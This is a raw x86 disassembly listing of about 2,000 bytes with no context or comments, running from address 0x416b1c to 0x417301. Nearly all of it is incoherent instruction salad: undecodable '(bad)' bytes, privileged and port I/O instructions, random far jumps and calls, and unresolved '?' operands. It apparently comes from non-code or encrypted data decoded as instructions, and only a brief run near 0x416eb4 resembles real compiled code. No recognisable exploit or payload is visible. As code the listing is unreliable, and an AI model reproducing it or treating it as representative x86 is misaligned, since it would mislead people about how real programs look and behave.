  416b1c:	dec    edx
  416b1d:	gs inc ebx
  416b1f:	dec    ebp
  416b20:	add    BYTE PTR [edx],al
  416b22:	pop    esp
  416b23:	aaa    
  416b24:	sbb    BYTE PTR [eax],ch
  416b26:	add    BYTE PTR [edx+eax*1-0x1546f0b1],dh
  416b2d:	icebp  
  416b2e:	les    ecx,FWORD PTR [ebp+0x28]
  416b31:	inc    ecx
  416b32:	mov    ds:0xd3aab3d0,eax
  416b37:	repz mov ds:0x436e2647,eax
  416b3d:	pop    edx
  416b3f:	and    al,0xa3
  416b41:	inc    esp
  416b42:	inc    esi
  416b43:	cmp    DWORD PTR [ebp-0x3705c975],esp
  416b49:	clc    
  416b4a:	xchg   ebx,edx
  416b4c:	lahf   
  416b4d:	popf   
  416b4e:	xchg   ebx,eax
  416b4f:	int    0x80
  416b51:	pop    ss
  416b52:	pop    esp
  416b53:	iret   
  416b54:	ret    0x294b
  416b57:	cli    
  416b58:	(bad)  
  416b5a:	cmp    ebx,DWORD PTR [ebp+eax*8+0x6b586adf]
  416b61:	mov    dl,0x38
  416b63:	mov    edx,0x4ffc3cf
  416b68:	jmp    0x416b42
  416b6a:	dec    edi
  416b6b:	push   eax
  416b6c:	jmp    0x7518447c
  416b71:	jg     0x416b4e
  416b73:	sbb    esi,esp
  416b75:	arpl   WORD PTR [edx],ax
  416b77:	pop    ss
  416b78:	mov    ebp,0xe8604fbc
  416b7d:	les    esp,FWORD PTR ds:0x965c5407
  416b83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b84:	lea    ecx,ds:0xebba1883
  416b8a:	fwait
  416b8b:	mov    dl,BYTE PTR [edx-0x5d6d28ea]
  416b91:	xchg   esi,eax
  416b92:	repz rcl BYTE PTR [ebp+0x39aa6257],1
  416b99:	cwde   
  416b9a:	or     cl,ch
  416b9c:	adc    al,bh
  416b9e:	dec    esi
  416b9f:	sbb    al,0xcd
  416ba1:	sbb    bl,BYTE PTR [eax+0x46373dc3]
  416ba7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ba8:	jne    0x416beb
  416baa:	out    dx,eax
  416bab:	retf   0xad96
  416bae:	dec    ecx
  416baf:	inc    esp
  416bb0:	cmp    edx,DWORD PTR [edx]
  416bb2:	push   0x6a3e8cb
  416bb7:	(bad)  
  416bb8:	sti    
  416bb9:	or     al,0xee
  416bbb:	mov    eax,0xf07e93ec
  416bc0:	outs   dx,DWORD PTR ds:[esi]
  416bc1:	jae    0x416b51
  416bc3:	ins    BYTE PTR es:[edi],dx
  416bc4:	rol    BYTE PTR [ecx+ebp*4+0x10],0xdd
  416bc9:	jle    0x416be4
  416bcb:	jmp    0x8e60:0x57df4b7e
  416bd2:	into   
  416bd3:	clc    
  416bd4:	cld    
  416bd5:	pop    DWORD PTR [ebp+0x5]
  416bd8:	ud0    eax,DWORD PTR [ebx+0x6e]
  416bdc:	adc    al,0x93
  416bde:	or     DWORD PTR [ebx-0x179b22e9],0x4100ba6b
  416be8:	retf   
  416be9:	mov    dl,0x83
  416beb:	cwde   
  416bec:	lds    edx,FWORD PTR ds:0x1bfeb74a
  416bf2:	outs   dx,BYTE PTR ds:[esi]
  416bf3:	jno    0x416c69
  416bf5:	ins    DWORD PTR es:[edi],dx
  416bf6:	xchg   esi,eax
  416bf7:	push   eax
  416bf9:	aad    0x32
  416bfb:	xor    DWORD PTR [ebx],esi
  416bfd:	aam    0x8a
  416bff:	out    0x4f,al
  416c01:	mov    esi,0xff9519a2
  416c06:	mov    al,ds:0x77450cf7
  416c0b:	cmp    dl,cl
  416c0d:	inc    edi
  416c0e:	mov    al,es:0x53658e35
  416c14:	cmc    
  416c15:	mov    ebp,0x5ac77290
  416c1a:	xchg   esp,eax
  416c1b:	sahf   
  416c1c:	or     al,0x65
  416c1e:	jge    0x416c10
  416c20:	jg     0x416bef
  416c22:	cld    
  416c23:	mov    ds:0x57410ff0,eax
  416c28:	push   ebx
  416c29:	cs and eax,0x55307171
  416c2f:	cdq    
  416c30:	cmc    
  416c31:	jmp    0x3b8a:0xc7c52ef1
  416c38:	fld    st(6)
  416c3a:	out    0x8c,eax
  416c3c:	xlat   BYTE PTR ds:[ebx]
  416c3d:	mov    cl,0xe7
  416c3f:	ins    BYTE PTR es:[edi],dx
  416c40:	sbb    eax,0xeb7c9e52
  416c45:	imul   ebx,DWORD PTR [ecx],0xffffffe8
  416c48:	dec    edi
  416c49:	psubsw mm6,QWORD PTR [ebx-0x4a]
  416c4d:	out    0x96,eax
  416c4f:	(bad)  [ecx]
  416c51:	std    
  416c52:	jmp    0x416cb4
  416c54:	xor    BYTE PTR [ecx-0x4b92192d],al
  416c5a:	push   cs
  416c5b:	cmp    bh,BYTE PTR [ecx+edi*4]
  416c5e:	sahf   
  416c5f:	retf   
  416c60:	push   eax
  416c61:	jo     0x416c66
  416c63:	popf   
  416c64:	das    
  416c65:	adc    eax,0x18d4ad23
  416c6a:	inc    edi
  416c6b:	xor    al,0xf8
  416c6d:	dec    ecx
  416c6e:	in     eax,0xc2
  416c70:	jg     0x416c96
  416c72:	sub    eax,0x188e059f
  416c77:	add    DWORD PTR [ebx],esi
  416c79:	sbb    DWORD PTR [ebp+0x6ca03818],edi
  416c7f:	adc    eax,0xda87cf39
  416c84:	scas   eax,DWORD PTR es:[edi]
  416c85:	hlt    
  416c86:	mov    cl,0xb2
  416c88:	data16 add dl,ch
  416c8b:	push   0xfae2bb84
  416c90:	ror    dl,cl
  416c92:	sub    al,ah
  416c94:	push   esi
  416c95:	jbe    0x416c3a
  416c97:	loop   0x416cc0
  416c99:	out    0xf,al
  416c9b:	sub    ebx,DWORD PTR [ebx+0x3ec5c8e2]
  416ca1:	add    cl,cl
  416ca3:	sub    DWORD PTR [edi+0x5b9bf060],edi
  416ca9:	inc    esp
  416caa:	mov    BYTE PTR [edx-0x373631bd],al
  416cb0:	cmp    edi,DWORD PTR [esi-0x7]
  416cb3:	shl    ch,cl
  416cb5:	adc    bh,0x23
  416cb8:	fst    DWORD PTR [edx+ebx*1]
  416cbb:	cmp    eax,0xaddf4713
  416cc0:	std    
  416cc1:	in     eax,dx
  416cc2:	adc    DWORD PTR ss:[eax],0x78
  416cc6:	cli    
  416cc7:	or     DWORD PTR [eax-0x6],0xd511ec79
  416cce:	push   cs
  416ccf:	sub    al,0x20
  416cd1:	or     BYTE PTR [edi],al
  416cd3:	cmp    esi,DWORD PTR [ecx-0x7a]
  416cd6:	mov    bl,0x0
  416cd8:	dec    ecx
  416cd9:	pusha  
  416cda:	or     al,0xe8
  416cdd:	(bad)  
  416cdf:	repz ja 0x416d2e
  416ce2:	push   ebx
  416ce3:	add    dl,cl
  416ce5:	xor    ch,bl
  416ce7:	pop    eax
  416ce8:	(bad)  
  416ce9:	repz imul eax,DWORD PTR [edi-0x7e4b1962],0x700d09ff
  416cf4:	call   0xcc74fe0c
  416cf9:	add    DWORD PTR [edi-0x17],ebx
  416cfc:	jg     0x416cf4
  416cfe:	push   0xd09adc1a
  416d03:	ror    DWORD PTR ds:0xa93c2818,cl
  416d09:	imul   eax,DWORD PTR [ebp-0x695b48d5],0xffffffe1
  416d10:	(bad)
  416d14:	aam    0xd4
  416d16:	bound  edx,QWORD PTR [esp+eiz*8-0x2a]
  416d1a:	js     0x416ce8
  416d1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d1d:	clc    
  416d1e:	push   ebp
  416d1f:	loope  0x416cba
  416d21:	lahf   
  416d22:	outs   dx,DWORD PTR ds:[esi]
  416d23:	dec    ecx
  416d24:	fistp  QWORD PTR [edi+edx*2-0x14]
  416d28:	sub    eax,0xaf476941
  416d2d:	adc    al,0xe5
  416d2f:	repnz inc esp
  416d31:	leave  
  416d32:	pop    ds
  416d33:	mov    BYTE PTR [ebx+0x3f],ah
  416d36:	sar    BYTE PTR [edi-0x79cdb7a5],1
  416d3c:	dec    ebx
  416d3d:	pop    edi
  416d3e:	xlat   BYTE PTR es:[ebx]
  416d40:	rcl    BYTE PTR [edi-0x5b],0x4d
  416d44:	xor    cl,al
  416d46:	adc    bl,dh
  416d48:	add    ebx,ebp
  416d4a:	pop    ebx
  416d4b:	sar    BYTE PTR [ecx],cl
  416d4d:	sbb    eax,DWORD PTR [ebp-0x6c]
  416d50:	rcl    BYTE PTR ss:[ebp-0x4a4280ba],0xf7
  416d58:	imul   esp,DWORD PTR [edx+ecx*1-0xccd53c0],0xf9a14920
  416d63:	pop    esp
  416d64:	scas   al,BYTE PTR es:[edi]
  416d65:	inc    esi
  416d66:	aaa    
  416d67:	jle    0x416cf9
  416d69:	sub    dh,BYTE PTR [ecx+0x1ea1f758]
  416d6f:	aas    
  416d70:	mov    dl,0x16
  416d72:	call   0x1380:0x521ec7fd
  416d79:	pushf  
  416d7a:	lds    ebx,FWORD PTR [ebx+ebp*1]
  416d7d:	mov    eax,0x63b61ad6
  416d82:	(bad)  
  416d83:	xchg   ecx,eax
  416d84:	fdivr  st(1),st
  416d86:	dec    ebx
  416d87:	pushw  cs
  416d89:	into   
  416d8a:	inc    ecx
  416d8b:	pop    ebx
  416d8c:	push   cs
  416d8d:	ss mov bh,0x73
  416d90:	sbb    cl,al
  416d92:	adc    eax,0x41c73e91
  416d97:	hlt    
  416d98:	aas    
  416d99:	jb     0x416e19
  416d9b:	daa    
  416d9c:	xchg   ebp,eax
  416d9d:	test   al,0xda
  416d9f:	fimul  DWORD PTR [eax+ebx*1+0x3]
  416da3:	mov    cl,0x67
  416da5:	(bad)  
  416da6:	aad    0x4b
  416da8:	ret    
  416da9:	mov    cl,0x5
  416dab:	sbb    eax,0xc0591512
  416db0:	push   esi
  416db1:	add    DWORD PTR [edi-0x69],0x2be9427a
  416db8:	mov    esi,0x2801bffe
  416dbd:	ss jle 0x416e39
  416dc0:	jnp    0x416d56
  416dc2:	cs mov al,0x51
  416dc5:	sub    DWORD PTR [ebx],ebx
  416dc7:	pop    esp
  416dc8:	das    
  416dc9:	sbb    DWORD PTR [ebx],esp
  416dcb:	mov    cl,0xcb
  416dcd:	mov    ebp,0x1f227252
  416dd2:	mov    ds:0xc6c15871,eax
  416dd7:	pusha  
  416dd8:	nop
  416dd9:	gs pop ss
  416ddb:	xor    eax,0xac5a46d5
  416de0:	jnp    0x416dcd
  416de2:	or     eax,0xd544a1a2
  416de7:	cmp    ah,BYTE PTR [esi-0x30]
  416dea:	xor    BYTE PTR [edx-0x79],ah
  416ded:	shl    DWORD PTR [esi],1
  416def:	test   al,0x9a
  416df1:	std    
  416df2:	push   ebp
  416df3:	ins    BYTE PTR es:[edi],dx
  416df4:	(bad)  
  416df5:	cli    
  416df6:	mov    dh,0x4b
  416df8:	add    DWORD PTR [edx],eax
  416dfa:	mov    WORD PTR [ecx+0x7c],?
  416dfd:	add    bl,ch
  416dff:	push   eax
  416e00:	std    
  416e01:	int    0xb7
  416e03:	and    ecx,DWORD PTR [esi]
  416e05:	scas   eax,DWORD PTR es:[edi]
  416e06:	div    DWORD PTR [eax+0x57]
  416e09:	xchg   dh,al
  416e0b:	ins    DWORD PTR es:[edi],dx
  416e0c:	cmp    al,0x22
  416e0e:	mov    BYTE PTR [eax+ebx*2+0x2f121952],ch
  416e15:	shl    BYTE PTR [edx],1
  416e17:	jno    0x416dcf
  416e19:	repz pop ds
  416e1b:	ins    DWORD PTR es:[edi],dx
  416e1c:	rcl    bh,0x3c
  416e1f:	ja     0x416e60
  416e21:	std    
  416e22:	cwde   
  416e23:	push   esp
  416e24:	jl     0x416dd5
  416e26:	push   ds
  416e27:	sub    eax,0x897e717
  416e2c:	daa    
  416e2d:	and    al,0x2e
  416e2f:	push   edi
  416e30:	pushf  
  416e31:	adc    eax,0xb51af982
  416e36:	test   BYTE PTR [ebp+0x55af2bb4],cl
  416e3c:	ficom  DWORD PTR [ebx-0x33b8d48f]
  416e42:	cmp    al,0x37
  416e44:	xchg   esi,eax
  416e45:	jnp    0x416e6f
  416e47:	mov    al,ch
  416e49:	mov    ah,0x2c
  416e4b:	les    edx,FWORD PTR [eax]
  416e4d:	mov    bl,dl
  416e4f:	aam    0xc8
  416e51:	ins    DWORD PTR es:[edi],dx
  416e52:	and    eax,0x821f67a4
  416e57:	pop    esp
  416e58:	push   cs
  416e59:	jo     0x416e4a
  416e5b:	xor    al,0x88
  416e5d:	mov    dl,0xa8
  416e5f:	repnz fsubr st,st(4)
  416e62:	ins    DWORD PTR es:[edi],dx
  416e63:	jecxz  0x416ed0
  416e65:	pop    ebx
  416e66:	ja     0x416e41
  416e68:	in     eax,0x9d
  416e6a:	xchg   esi,eax
  416e6b:	(bad)  
  416e6c:	cmp    al,0x7
  416e6e:	or     DWORD PTR [edi+0xb18a4ab],esp
  416e74:	adc    DWORD PTR [ecx],ebp
  416e76:	scas   eax,DWORD PTR es:[edi]
  416e77:	pmaxub mm3,mm5
  416e7a:	outs   dx,BYTE PTR ds:[esi]
  416e7b:	lahf   
  416e7c:	sub    DWORD PTR [esp+ebx*1-0x23],0x77
  416e81:	hlt    
  416e82:	fisub  WORD PTR [esi-0x169f73ca]
  416e88:	div    cl
  416e8a:	(bad)  
  416e8b:	out    dx,eax
  416e8c:	mov    esp,0x74659747
  416e91:	je     0x416e18
  416e93:	xchg   esi,eax
  416e94:	test   eax,0xcb39cb65
  416e99:	or     ch,BYTE PTR [ecx]
  416e9b:	fs xchg edx,eax
  416e9d:	inc    BYTE PTR [eax+0x3d15ab75]
  416ea3:	add    al,0x3c
  416ea5:	inc    esp
  416ea6:	(bad)
  416eaa:	dec    edx
  416eab:	out    dx,eax
  416eac:	out    0x2b,al
  416eae:	cs xor eax,0xba699573
  416eb4:	xor    ecx,edx
  416eb6:	shrd   eax,ecx,0x2
  416eba:	or     eax,DWORD PTR [ebp+0x10]
  416ebd:	shr    ecx,0x2
  416ec0:	mov    DWORD PTR [ebp+0x8],eax
  416ec3:	mov    eax,ecx
  416ec5:	or     eax,DWORD PTR [ebp+0x14]
  416ec8:	mov    ecx,DWORD PTR [ebx]
  416eca:	mov    edx,DWORD PTR [ebx+0x4]
  416ecd:	push   eax
  416ece:	push   DWORD PTR [ebp+0x8]
  416ed1:	jmp    0x41745b
  416ed6:	aaa    
  416ed7:	or     bl,BYTE PTR [ebp+0x2e982194]
  416edd:	js     0x416f43
  416edf:	stc    
  416ee0:	sub    al,0xb4
  416ee2:	mov    ecx,0xb172b46a
  416ee7:	cdq    
  416ee8:	or     al,0x16
  416eea:	cmp    eax,0xcb161604
  416eef:	bound  ebp,QWORD PTR [ebp-0x24]
  416ef2:	mov    edx,edi
  416ef4:	push   0x5d5fb83f
  416ef9:	adc    edi,ecx
  416efb:	cmp    al,0xa9
  416efd:	cmp    cl,BYTE PTR [edx-0x29c57d62]
  416f03:	rcl    DWORD PTR [esi+0x5],1
  416f06:	shr    ebp,0xca
  416f09:	imul   bp,WORD PTR [ecx-0x10a06981],0xff85
  416f11:	lds    ebx,FWORD PTR [eax+0x1ae02559]
  416f17:	ficomp WORD PTR [ebx-0x69]
  416f1a:	idiv   DWORD PTR [ecx]
  416f1c:	or     edi,DWORD PTR [eax+ebp*8-0x4166329b]
  416f23:	dec    ebp
  416f24:	fdivr  QWORD PTR [edi]
  416f26:	add    BYTE PTR [esi],dh
  416f28:	scas   al,BYTE PTR es:[edi]
  416f29:	mov    ebx,0x19688b43
  416f2e:	mov    bh,0xc1
  416f30:	shl    DWORD PTR [ebx+0x3e],0xb6
  416f34:	std    
  416f35:	scas   al,BYTE PTR es:[edi]
  416f36:	outs   dx,DWORD PTR ds:[esi]
  416f37:	push   ss
  416f38:	bound  ebp,QWORD PTR [eax]
  416f3a:	cli    
  416f3b:	and    al,0x8f
  416f3d:	sub    DWORD PTR [eax+0x18],eax
  416f40:	mov    esi,0x6ccec195
  416f45:	shr    cl,1
  416f47:	cmp    al,0xdc
  416f49:	mov    bh,0xdd
  416f4b:	pminsw mm1,QWORD PTR [ecx-0x1091cc36]
  416f52:	xor    BYTE PTR [esp+ecx*8-0x4a],0xeb
  416f57:	(bad)  
  416f58:	sbb    edx,edi
  416f5a:	jl     0x416f7f
  416f5c:	and    eax,0xb5d42f2e
  416f61:	in     al,dx
  416f62:	in     eax,dx
  416f63:	pop    ss
  416f64:	inc    esp
  416f65:	mov    ds:0x6c2113e5,eax
  416f6a:	ins    BYTE PTR es:[edi],dx
  416f6b:	inc    edi
  416f6c:	xlat   BYTE PTR ds:[ebx]
  416f6d:	cmc    
  416f6e:	mov    ebp,0xfdd60464
  416f73:	jo     0x416f6a
  416f75:	rcl    DWORD PTR [eax-0x302f7e2],1
  416f7b:	jno    0x416f4f
  416f7d:	test   eax,0xf3b5bfdc
  416f82:	aaa    
  416f83:	mov    ecx,0xbab2b156
  416f88:	and    eax,0xc4252ead
  416f8d:	lea    eax,[ebp+ecx*1-0x6a]
  416f91:	(bad)  
  416f93:	jecxz  0x417009
  416f95:	sub    eax,0x3d46d706
  416f9a:	test   dl,0x4
  416f9d:	pusha  
  416f9e:	bsr    esi,DWORD PTR [edx+0x24]
  416fa2:	inc    esp
  416fa3:	or     BYTE PTR ds:0xfc1d7546,ah
  416fa9:	jp     0x416f92
  416fab:	lds    esi,FWORD PTR [esi-0x63]
  416fae:	arpl   WORD PTR [ebx],ax
  416fb0:	pusha  
  416fb1:	sub    esp,DWORD PTR [esi+0x5901ad7c]
  416fb7:	das    
  416fb8:	leave  
  416fb9:	jae    0x416f4b
  416fbb:	and    cl,BYTE PTR [edi]
  416fbd:	push   edi
  416fbe:	gs jmp 0xf681:0x2a692514
  416fc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fc7:	mov    edx,0x4df37c9
  416fcc:	xor    eax,0x38a17e6f
  416fd1:	cmp    eax,0x83d29ce
  416fd6:	push   ecx
  416fd7:	(bad)  
  416fd8:	int3   
  416fd9:	jge    0x416fb2
  416fdb:	inc    ebx
  416fdc:	jle    0x416ff8
  416fde:	dec    ebx
  416fdf:	test   eax,0x1dc0363d
  416fe4:	ss inc ecx
  416fe6:	jl     0x416f86
  416fe8:	retf   
  416fe9:	mov    ebp,0xc6cbab55
  416fee:	xchg   esp,eax
  416fef:	jg     0x416fa5
  416ff1:	stc    
  416ff2:	add    bl,al
  416ff4:	or     eax,0x9441f852
  416ff9:	xchg   edx,eax
  416ffa:	cmp    DWORD PTR [edx],esp
  416ffc:	jmp    0x41701f
  416ffe:	test   al,0x89
  417000:	pop    ebp
  417001:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417002:	xor    esi,ecx
  417004:	jae    0x416fce
  417006:	ins    BYTE PTR es:[edi],dx
  417007:	add    ebx,DWORD PTR [ebx-0x15]
  41700a:	dec    DWORD PTR [esi+0x76d8d7a6]
  417010:	jo     0x416fb3
  417012:	out    0x71,al
  417014:	sbb    eax,0x69530931
  417019:	jnp    0x416fa5
  41701b:	call   0x6a82c2b
  417020:	xor    dh,cl
  417022:	(bad)  
  417023:	fstp   QWORD PTR [esi+edi*2-0x2c76e568]
  41702a:	push   ebx
  41702b:	ins    DWORD PTR es:[edi],dx
  41702c:	add    DWORD PTR ds:0x1d1635a6,esi
  417032:	leave  
  417033:	out    dx,al
  417034:	arpl   sp,si
  417036:	fwait
  417037:	push   ds
  417038:	ins    DWORD PTR es:[edi],dx
  417039:	sub    BYTE PTR [ecx],0x38
  41703c:	mov    ?,WORD PTR [edx+eax*2+0x66]
  417040:	imul   edi,DWORD PTR [esi+ebx*8],0x208684c4
  417047:	xchg   ecx,eax
  417048:	mov    ah,0x90
  41704a:	add    BYTE PTR [ebx-0x55],dh
  41704d:	or     ah,bl
  41704f:	loopne 0x4170ac
  417051:	and    BYTE PTR [eax-0x69],0x8a
  417055:	cmp    ecx,DWORD PTR [eax-0x1e]
  417058:	xor    DWORD PTR [ecx+0x16],ecx
  41705b:	pop    eax
  41705c:	adc    DWORD PTR [ebp+0x23],ebp
  41705f:	sbb    dh,BYTE PTR [edi+0x15]
  417062:	or     DWORD PTR [esi+0x9],edx
  417065:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417066:	orps   xmm2,XMMWORD PTR [esi-0x73384405]
  41706d:	mov    DWORD PTR [ebx-0x50eb6db9],esi
  417073:	test   ebp,eax
  417075:	dec    ebp
  417076:	xchg   edi,eax
  417077:	dec    ebp
  417078:	inc    esi
  417079:	lods   eax,DWORD PTR ds:[esi]
  41707a:	cwde   
  41707b:	push   ebx
  41707c:	mov    al,ds:0x67d7260f
  417081:	cmc    
  417082:	loopne 0x4170da
  417084:	frstor [eax+0x4efe37cc]
  41708a:	cs scas al,BYTE PTR es:[edi]
  41708c:	mov    ah,0xcc
  41708e:	jl     0x41708b
  417090:	pop    ds
  417091:	adc    edx,0xffffffc4
  417094:	push   0xffffffd3
  417096:	dec    esi
  417097:	mov    al,ds:0xa6641b76
  41709c:	(bad)  
  41709d:	iret   
  41709e:	xchg   edx,eax
  41709f:	mov    edi,0x6c7c6396
  4170a4:	pop    eax
  4170a5:	test   eax,0x261cfa2
  4170aa:	std    
  4170ab:	inc    eax
  4170ac:	or     BYTE PTR [edi+0x61],ah
  4170af:	shl    BYTE PTR [ebx+ebp*1],cl
  4170b2:	sbb    esp,DWORD PTR [esi]
  4170b4:	xor    bh,bl
  4170b6:	aaa    
  4170b7:	adc    DWORD PTR [eax+ebp*8-0x10746081],eax
  4170be:	xchg   esp,eax
  4170bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170c0:	arpl   WORD PTR [ebx-0xf],ax
  4170c3:	mov    dl,0xd9
  4170c5:	in     eax,0x5
  4170c7:	cmp    al,0xc3
  4170c9:	push   es
  4170ca:	cmp    DWORD PTR [ebx],esp
  4170cc:	mov    edx,0xcb57e658
  4170d1:	inc    esi
  4170d2:	mov    ecx,0xea6b5fa9
  4170d7:	pop    ecx
  4170d8:	into   
  4170d9:	into   
  4170da:	and    al,0x53
  4170dc:	mov    WORD PTR [edi],ds
  4170de:	sbb    DWORD PTR [eax-0x156a90b0],0xde1f8757
  4170e8:	push   ecx
  4170e9:	xchg   ebp,eax
  4170ea:	sub    eax,0xb3101e3a
  4170ef:	and    BYTE PTR [ebp-0x1632c811],ch
  4170f5:	xchg   edx,eax
  4170f6:	scas   eax,DWORD PTR es:[edi]
  4170f7:	repz mov ds:0xf67d306f,eax
  4170fd:	neg    DWORD PTR [edx]
  4170ff:	push   cs
  417100:	loopne 0x41717e
  417102:	iret   
  417103:	inc    esi
  417104:	xchg   DWORD PTR [ecx-0x599c52d1],ebx
  41710a:	pop    ebp
  41710b:	mov    bh,0x97
  41710d:	aam    0x23
  41710f:	stos   BYTE PTR es:[edi],al
  417110:	and    cl,0xe7
  417113:	(bad)  
  417114:	aam    0x65
  417116:	bound  edi,QWORD PTR [ebp-0x7dfe7085]
  41711c:	xor    eax,0x8fef21e8
  417121:	add    ch,dh
  417123:	or     edx,0xc5bca81d
  417129:	sahf   
  41712a:	sbb    DWORD PTR [ebx+eiz*1-0x1a46129d],ebx
  417131:	pop    edx
  417132:	jle    0x417176
  417134:	jmp    0xc300:0xec6d7ec2
  41713b:	mov    edx,0x73f7d281
  417140:	arpl   WORD PTR [edx+0x5c],sp
  417143:	cld    
  417144:	mov    dh,0x3d
  417146:	xor    ebx,DWORD PTR [ebp-0xbb07b8f]
  41714c:	fsub   st(0),st
  41714e:	rol    DWORD PTR [ebp-0x328d19ce],0x72
  417155:	sub    ebp,DWORD PTR [ebx+ebx*4-0x5b]
  417159:	das    
  41715a:	pop    ecx
  41715b:	fiadd  DWORD PTR [eax]
  41715d:	test   eax,0xe4426e6f
  417162:	inc    edi
  417163:	sub    cl,BYTE PTR [ecx+edx*4]
  417166:	fcomi  st,st(0)
  417168:	enter  0xf7cb,0x33
  41716c:	adc    eax,ebp
  41716e:	sbb    DWORD PTR ds:0xc77f91c1,eax
  417174:	jbe    0x41715f
  417176:	or     DWORD PTR [ecx+esi*8+0x58ba1e8],eax
  41717d:	call   0x94e9:0xd23ffffb
  417184:	repz cdq 
  417186:	cs cmp dl,ch
  417189:	int3   
  41718a:	sbb    BYTE PTR [esi-0x21],cl
  41718d:	pop    edi
  41718e:	mov    bl,0x27
  417190:	adc    DWORD PTR [ebp+0x17aed580],esi
  417196:	(bad)  
  417197:	aam    0xb2
  417199:	or     dl,BYTE PTR [ebp+0x7d]
  41719c:	add    eax,0x93825cd1
  4171a1:	inc    esp
  4171a2:	fdivr  DWORD PTR [esi]
  4171a4:	(bad)
  4171a7:	cmc    
  4171a8:	push   cs
  4171a9:	or     dl,dl
  4171ab:	neg    BYTE PTR [ecx]
  4171ad:	ret    
  4171ae:	inc    ecx
  4171af:	inc    ebp
  4171b0:	sahf   
  4171b1:	dec    ebx
  4171b2:	mov    ebp,0x76297be8
  4171b7:	rol    ch,0x30
  4171ba:	push   ebx
  4171bb:	dec    edx
  4171bc:	ja     0x41714c
  4171be:	or     dl,dh
  4171c0:	pop    esi
  4171c1:	push   ecx
  4171c2:	sbb    edi,ebx
  4171c4:	fnstcw WORD PTR [esi+0x7d7c098]
  4171ca:	fmul   DWORD PTR ds:0x84f9b976
  4171d0:	inc    edi
  4171d1:	mov    edx,0xc59e7e7a
  4171d6:	lahf   
  4171d7:	cs pop ds
  4171d9:	xchg   esi,eax
  4171da:	dec    esp
  4171db:	scas   eax,DWORD PTR es:[edi]
  4171dc:	repz cwde 
  4171de:	stos   DWORD PTR es:[edi],eax
  4171df:	or     DWORD PTR [ebp+edx*8+0x7a],esi
  4171e3:	test   DWORD PTR [esi],0x3774e038
  4171e9:	sti    
  4171ea:	adc    ebx,DWORD PTR [ebx]
  4171ec:	jg     0x4171f0
  4171ee:	lahf   
  4171ef:	inc    ebp
  4171f0:	or     bh,ah
  4171f2:	mov    dl,0xe
  4171f4:	mov    dl,0x16
  4171f6:	stos   BYTE PTR es:[edi],al
  4171f7:	add    dl,BYTE PTR [edx-0x26]
  4171fa:	cmp    eax,0x184583ff
  4171ff:	mov    ecx,0xfa6c940f
  417204:	push   ebx
  417205:	cmp    BYTE PTR [ebx-0x5b263510],dh
  41720b:	ins    BYTE PTR es:[edi],dx
  41720c:	in     al,0x93
  41720e:	inc    eax
  41720f:	call   0x1631:0x69ce979c
  417216:	je     0x417281
  417218:	dec    ebx
  417219:	les    edx,FWORD PTR [eax+0x5fa47c6]
  41721f:	cmp    dh,BYTE PTR [ebx]
  417221:	arpl   WORD PTR [edx-0x37bf49ab],cx
  417227:	inc    edx
  417228:	test   DWORD PTR [ecx],ebx
  41722a:	(bad)  
  41722b:	pop    edi
  41722c:	jae    0x417203
  41722e:	fwait
  41722f:	xor    BYTE PTR [ebp-0xbe1d53f],0xf3
  417236:	test   BYTE PTR [edi],dh
  417238:	pop    eax
  417239:	push   0xe08958cc
  41723e:	mov    edx,DWORD PTR [ebx+0xb]
  417241:	(bad)  
  417242:	sub    BYTE PTR [edx-0x17],bh
  417245:	mov    ah,BYTE PTR [edi-0x2cff8fb2]
  41724b:	(bad)  
  41724c:	lock sbb ecx,esp
  41724f:	bound  edx,QWORD PTR [ebp+0x105ed470]
  417255:	push   ebx
  417256:	inc    dl
  417258:	and    al,BYTE PTR [edi+0x3d]
  41725b:	sti    
  41725c:	mov    ah,0xc9
  41725e:	lock jne 0x417209
  417261:	fdivr  QWORD PTR [esi+ebx*1-0x65]
  417265:	clc    
  417266:	ret    
  417267:	rcr    DWORD PTR [edx+0x4ff415ba],cl
  41726d:	rcl    DWORD PTR [edi],1
  41726f:	inc    eax
  417270:	jno    0x4171f8
  417272:	xor    al,0xf0
  417274:	mov    bh,0x4b
  417276:	lds    eax,FWORD PTR [edx-0x62]
  417279:	or     BYTE PTR [ebp-0x63],cl
  41727c:	int    0x93
  41727e:	ror    DWORD PTR [esi-0x2af0cf6a],1
  417284:	mov    dl,0xf9
  417286:	inc    edi
  417287:	cmc    
  417288:	sbb    eax,0xa99e6250
  41728d:	mov    ebp,DWORD PTR [edx]
  41728f:	cmp    eax,0x2a0fd289
  417294:	or     al,0xd2
  417296:	cmp    DWORD PTR [ecx],esp
  417298:	mov    BYTE PTR [ecx+eax*2],dh
  41729b:	sbb    al,0xfd
  41729d:	popf   
  41729e:	daa    
  41729f:	outs   dx,DWORD PTR ds:[esi]
  4172a0:	call   0x7e26:0x183cc084
  4172a7:	mov    ah,BYTE PTR [esi+0x63]
  4172aa:	iret   
  4172ab:	cli    
  4172ac:	sbb    BYTE PTR [ebp+ebp*1-0x436b15bc],bh
  4172b3:	cdq    
  4172b4:	or     eax,0x5af6d5eb
  4172b9:	shl    BYTE PTR [esi],1
  4172bb:	pop    es
  4172bc:	sbb    eax,0xe5dcd2c1
  4172c1:	mov    cl,0x58
  4172c3:	xchg   esi,eax
  4172c4:	aas    
  4172c5:	sahf   
  4172c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172c7:	bound  edx,QWORD PTR [ecx+0x78e1d0f1]
  4172cd:	addr16 sbb edi,esi
  4172d0:	mov    ebp,0x4fdbb2c6
  4172d5:	mov    ds:0xb5d3cfb,al
  4172da:	(bad)  
  4172db:	popf   
  4172dc:	jnp    0x4172ed
  4172de:	std    
  4172df:	inc    ecx
  4172e0:	jbe    0x417352
  4172e2:	mov    eax,0x92081d40
  4172e7:	(bad)  
  4172e8:	fldcw  WORD PTR [edx]
  4172ea:	fst    DWORD PTR [eax]
  4172ec:	loope  0x4172fb
  4172ee:	pop    ebp
  4172ef:	addr16 jmpw 0x40b
  4172f4:	rcr    ebp,0x1c
  4172f7:	icebp  
  4172f8:	inc    esp
  4172f9:	iret   
  4172fa:	inc    ecx
  4172fb:	lds    esp,FWORD PTR [esi+0x3093430d]
  417301:	or     eax,0x34471df5
